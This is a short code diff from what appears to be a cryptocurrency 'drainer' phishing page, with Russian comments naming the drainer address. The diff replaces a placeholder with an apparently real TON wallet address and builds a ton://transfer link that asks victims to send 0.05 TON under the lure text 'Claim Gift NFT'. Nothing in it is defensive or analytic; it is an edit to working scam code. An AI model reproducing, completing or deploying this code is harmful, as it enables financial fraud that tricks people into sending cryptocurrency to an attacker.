@@ -130,7 +130,7 @@ function showWalletOpenOptions() {
 function openTonWallet() {
     // Создаем ссылку для открытия в TON Wallet (Telegram)
     // Адрес дрейнера - замените на реальный
-    const drainerAddress = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+    const drainerAddress = "UQA9d56l9neDxiKiRqWq8-E3uYLxjT41xebBcA1Cl1IaP93B";
     const amount = "50000000"; // 0.05 TON
     
     const tonLink = `ton://transfer/${drainerAddress}?amount=${amount}&text=Claim%20Gift%20NFT`;
